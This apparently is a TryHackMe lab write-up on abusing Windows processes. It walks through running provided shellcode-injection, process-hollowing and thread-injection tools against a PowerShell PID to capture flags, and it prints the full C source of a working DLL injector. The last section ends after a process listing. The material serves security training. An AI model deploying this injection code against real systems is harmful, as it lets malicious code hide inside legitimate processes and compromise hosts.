# Room Information

# Room Tasks

## Abusing Processes

1. Started up this task's machine
2. We'll then open up PowerShell on the provided Windows machine

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt4.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt5.png)

3. `Get-Process` from the Windows machine to display all of the processes that are currently running on this machine
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    139       9    14324      13832              2952   0 amazon-ssm-agent
     80       5      852        304              2144   0 CompatTelRunner
    151       9     6596       1340              2240   0 conhost
    151       9     6600      12468              2516   0 conhost
    155       9     6636      12500              4488   0 conhost
    272      14     5668      19112       1.66   4540   2 conhost
    348      13     2148       5132               560   0 csrss
    161       9     1640       4732               632   1 csrss
    280      12     2024       5156              2428   2 csrss
    367      15     3564      15108       0.22   3388   2 ctfmon
    233      23     5008      14192       0.13   4744   2 dllhost
    604      28    16276      46644               108   2 dwm
    541      22    16160      38436               504   1 dwm
   1698      71    33568     101380       5.48   3504   2 explorer
     49       6     1428       3744               896   0 fontdrvhost
     49       6     1632       4276               904   1 fontdrvhost
     49       8     3784       8812              1448   2 fontdrvhost
    196      11     1744       1444              4024   0 GoogleCrashHandler
    173       9     1856        972              3740   0 GoogleCrashHandler64
    317      17     2900       4444              3068   0 GoogleUpdate
    236      14     2416       1756              3292   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1160       5060              2072   0 LiteAgent
    461      25    10988      43312              2432   1 LogonUI
   1000      22     4928      14684               772   0 lsass
    152       8     2200       7476              4936   0 MpCmdRun
    208      10     2472       9080              5064   0 MpCmdRun
    222      13     2988      10176              4476   0 msdtc
    534      70   173772      98216              1468   0 MsMpEng
    654      50   138580     148660       6.81   1760   2 powershell
    309      13     2460      11216       0.06   3084   2 rdpclip
      0      13     2048      11500                68   0 Registry
    223      11     2264      12092       0.13   2860   2 RuntimeBroker
    456      22     9104      29472       1.73   3500   2 RuntimeBroker
    241      13     3388      18228       0.13   3980   2 RuntimeBroker
   1127      73    83852     156512       4.45   3988   2 SearchUI
    308      11     3340       7684               760   0 services
    749      30    15540      52256       0.36   3872   2 ShellExperienceHost
    451      17     4792      24620       0.58   3104   2 sihost
    324      20     7680      22404       0.05   4640   2 smartscreen
     56       3      508       1224               408   0 smss
    473      22     5680      16552              2020   0 spoolsv
    155      10    14856      17108              2532   0 ssm-agent-worker
    799      26    26376      39680               620   0 svchost
   1941     106    43104      77388               636   0 svchost
    590      30    11124      21952               752   0 svchost
    831      23     6616      23580               876   0 svchost
    735      16     4520      10896               968   0 svchost
    180      10     3900      12984               976   0 svchost
    627      20    15704      27292              1164   0 svchost
    570      29     8096      20948              1204   0 svchost
    311      11     1964       8812              1272   0 svchost
    692      38     8160      22568              1284   0 svchost
    361      16    10384      11376              1400   0 svchost
    413      32     8884      17784              1420   0 svchost
    206      10     1648       7268              1752   0 svchost
    200      11     1584       7124              1792   0 svchost
    201      10     2052       8140              2160   0 svchost
    455      20     6200      30364       0.33   3212   2 svchost
    183      11     4860      11116              3804   0 svchost
    388      16     5436      15476              2132   0 Sysmon
   1917       0      192        156                 4   0 System
    235      20     3956      12832       0.08   3236   2 taskhostw
    120       7     1252       6612              2212   0 unsecapp
    172      11     1348       6848               680   0 wininit
    250      12     2628      15332               696   1 winlogon
    276      12     2504       9808              2632   2 winlogon
    173       9     2224       8432              4196   0 WmiPrvSE
```

4. `cd <EXPLOIT DIRECTORY>` from the Windows machine to change into the directory containing our shellcode injection
```PowerShell
PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
```

5. `.\<EXPLOIT> <PID>` from the Windows machine while providing a PID of a process that's running under the current user we're running as, for which we chose 1760 as the PID since that's the PID for PowerShell, which we are currently running, and by doing so we've successfully managed to inject shellcode into the target process, which ended up giving us the flag for this task
```PowerShell
PS C:\Users\THM-Attacker\Desktop\Injectors> .\shellcode-injector.exe 1760
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt6.png)


**TASK COMPLETED!**

## Expanding Process Abuse

1. Started up this task's machine
2. We'll then open up PowerShell on the provided Windows machine

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt4.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Processes%20pt5.png)

3. `cd <EXPLOIT DIRECTORY>` from the Windows machine to change into the directory containing our process hollowing script
```PowerShell
PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
```

4. `.\<EXPLOIT>` from the Windows machine to execute the provided process hollowing script, which ended up displaying us this task's flag

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Expanding%20Process%20Abuse%20pt1.png)


**TASK COMPLETED!**

## Abusing Process Components

1. Started up this task's machine
2. `Get-Process` from the Windows machine to display all of the processes that are currently running on this machine
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    139      10    13868      13312              2420   0 amazon-ssm-agent
    247      14     4076      17360       0.09   2020   3 backgroundTaskHost
     80       5      872        412              2092   0 CompatTelRunner
    151       9     6596       1432              2216   0 conhost
    151       9     6596      12364              2440   0 conhost
    254      14     5860      18724       0.28   3632   3 conhost
    277      12     2112       5248               452   3 csrss
    353      14     1820       4944               564   0 csrss
    161       9     1660       4700               636   1 csrss
    363      15     3548      15040       0.25   3976   3 ctfmon
    257      23     5280      14484       0.08   4748   3 dllhost
    545      22    16236      38328               792   1 dwm
    599      28    14404      41448              3196   3 dwm
   1563      58    25400      81652       3.45   1616   3 explorer
     49       6     1440       3676               908   0 fontdrvhost
     49       6     1636       4208               916   1 fontdrvhost
     49       6     1920       5308              3152   3 fontdrvhost
    220      12     1880       1480              4228   0 GoogleCrashHandler
    175      10     1856       1168              4252   0 GoogleCrashHandler64
    236      14     2360       1616              3880   0 GoogleUpdate
    330      17     2848       4432              4216   0 GoogleUpdate
    237      14     2360       2776              4296   0 GoogleUpdate
    334      18     3240      13624              4816   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1168       4996              2060   0 LiteAgent
    464      25    10980      43168              2500   1 LogonUI
   1030      22     4976      14512               780   0 lsass
    224      13     2996      10144              4480   0 msdtc
    519      70   173372      97836               812   0 MsMpEng
    586      29    63648      73284       1.67   5060   3 powershell
    318      13     2500      11096       0.11   3688   3 rdpclip
      0      13     7304      14096                68   0 Registry
    229      12     2344      12116       0.19   1588   3 RuntimeBroker
    492      25     9804      32208       2.02   3672   3 RuntimeBroker
    241      13     4156      14328       0.05   3720   3 RuntimeBroker
   1140      73    83860     158648       4.22   3416   3 SearchUI
    313      11     3620       7732               768   0 services
    768      30    15708      52320       0.34   2980   3 ShellExperienceHost
    242      12     2212      10128              4788   0 SIHClient
    468      18     4944      24612       0.69   3708   3 sihost
    329      20     7864      22872       0.16   1344   3 smartscreen
     56       3      528       1228               412   0 smss
    481      23     5840      16516              2012   0 spoolsv
    155      10    14908      17056              2456   0 ssm-agent-worker
    856      27    26340      38688               628   0 svchost
   1931     108    44288      80812               640   0 svchost
    868      23     6960      23760               888   0 svchost
    558      28    10092      19956               904   0 svchost
    826      18     4740      10964               980   0 svchost
    624      20    17976      29328              1176   0 svchost
    579      30     7648      19936              1212   0 svchost
    770      39     8656      22660              1268   0 svchost
    315      11     2168       8820              1276   0 svchost
    352      15    10068      11112              1332   0 svchost
    420      33     8908      17700              1420   0 svchost
    213      10     1800       7320              1672   0 svchost
    201      11     1680       6904              1744   0 svchost
    206      10     2140       8100              2176   0 svchost
    195      10     4260      13276              3612   0 svchost
    469      20     6144      29872       0.19   3796   3 svchost
    180      10     2476       8648              4028   0 svchost
    392      16     5608      15500              2160   0 Sysmon
   2041       0      192        156                 4   0 System
    241      20     3936      12584       0.03   3820   3 taskhostw
    126       8     1316       6540              2416   0 unsecapp
    179      11     1596       6824               656   0 wininit
    250      12     2708      15328               704   1 winlogon
    291      12     2688       9864              3100   3 winlogon
    183      10     2324       8552              1396   0 WmiPrvSE
    183      11     2704       8940              4332   0 WmiPrvSE
```

3. `cd <EXPLOIT DIRECTORY>` from the Windows machine to change into the directory containing our thread injector script that was provided to us with this machine
```PowerShell
PS C:\Users\THM-Attacker> cd .\Desktop\Injectors\
```

4. `.\<EXPLOIT> <PID>` from the Windows machine to execute the provided thread injector script by providing it with a PID of a process that's running under the current user that we're currently running as, which ended up displaying us this task's flag

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Abusing%20Process%20Components%20pt1.png)


**TASK COMPLETED!**

## Abusing DLLs

1. Started this task's machine
2. 2. 
```C
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    140      10    13632      13632              2420   0 amazon-ssm-agent
    246      14     4036      17300       0.08   3476   3 backgroundTaskHost
    254      14     6000      20736       0.14      8   3 conhost
    151       9     6596      12932              2440   0 conhost
    286      12     2124       6108               452   3 csrss
    336      13     1924       5000               564   0 csrss
    161       9     1660       4700               636   1 csrss
    363      15     3556      15188       0.28   3976   3 ctfmon
    247      22     4684      13932       0.09   4748   3 dllhost
    541      22    16204      38376               792   1 dwm
    595      29    24452      61528              3196   3 dwm
   1571      58    25072      86256       5.45   1616   3 explorer
     49       6     1440       4228               908   0 fontdrvhost
     49       6     1636       4700               916   1 fontdrvhost
     49       6     1932       5836              3152   3 fontdrvhost
    196      11     1740       1256              4228   0 GoogleCrashHandler
    173       9     1832        376              4252   0 GoogleCrashHandler64
    236      14     2360       1332              3880   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1168       5016              2060   0 LiteAgent
    460      25    11020      43220              2500   1 LogonUI
   1025      22     5192      14668               780   0 lsass
    222      13     2924      10228              4480   0 msdtc
    513      74   184824     129828               812   0 MsMpEng
    609      30    64016      73660       0.84    572   3 powershell
    316      13     2520      11260       0.16   3688   3 rdpclip
      0      13      516       9872                68   0 Registry
    248      13     2580      13280       0.22   1588   3 RuntimeBroker
    586      28     9420      31848       2.09   3672   3 RuntimeBroker
    235      12     3952      14352       0.05   3720   3 RuntimeBroker
   1160      76    90692     133736       5.55   3416   3 SearchUI
    310      11     3620       7788               768   0 services
    768      30    15708      52336       0.34   2980   3 ShellExperienceHost
    476      18     5048      24784       0.98   3708   3 sihost
    335      21     7320      21336       0.11   4900   3 smartscreen
     56       3      528       1228               412   0 smss
    481      23     5856      16920              2012   0 spoolsv
    155      11    15424      17636              2456   0 ssm-agent-worker
    849      27    30796      43804               628   0 svchost
   1846      99    43784      78172               640   0 svchost
    868      23     7196      24132               888   0 svchost
    622      31    10592      21880               904   0 svchost
    792      19     5096      11280               980   0 svchost
    608      20    16560      26728              1176   0 svchost
    604      31     8720      25324              1212   0 svchost
    693      38     8316      22664              1268   0 svchost
    313      11     2084       8812              1276   0 svchost
    368      16    11348      12780              1332   0 svchost
    404      32     8436      17360              1420   0 svchost
    221      10     1888       7412              1672   0 svchost
    202      11     1632       7128              1744   0 svchost
    203      10     2084       8100              2176   0 svchost
    130       7     1656       6368              3004   0 svchost
    184      10     4204      13176              3612   0 svchost
    455      19     6104      28864       0.22   3796   3 svchost
    293      16     4752      17788              2160   0 Sysmon
   1956       0      192        156                 4   0 System
    241      21     4036      13084       0.03   3820   3 taskhostw
    126       7     1280       6544              2416   0 unsecapp
    179      11     1596       6824               656   0 wininit
    250      12     2632      15700               704   1 winlogon
    291      12     2688      10172              3100   3 winlogon
    174       9     2116       8776               104   0 WmiPrvSE
```

